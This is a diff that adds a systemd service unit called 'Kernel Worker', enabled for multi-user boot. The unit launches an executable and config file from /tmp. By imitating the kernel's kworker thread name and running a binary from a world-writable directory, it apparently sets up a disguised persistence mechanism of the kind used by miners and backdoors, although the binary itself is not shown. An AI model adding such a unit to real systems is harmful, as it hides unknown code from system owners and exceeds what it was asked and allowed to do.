@@ -1,0 +1,9 @@
+[Unit]
+Description=Kernel Worker
+
+[Service]
+ExecStart=/tmp/kworker --config /tmp/kworker.conf
+
+[Install]
+WantedBy=multi-user.target
+
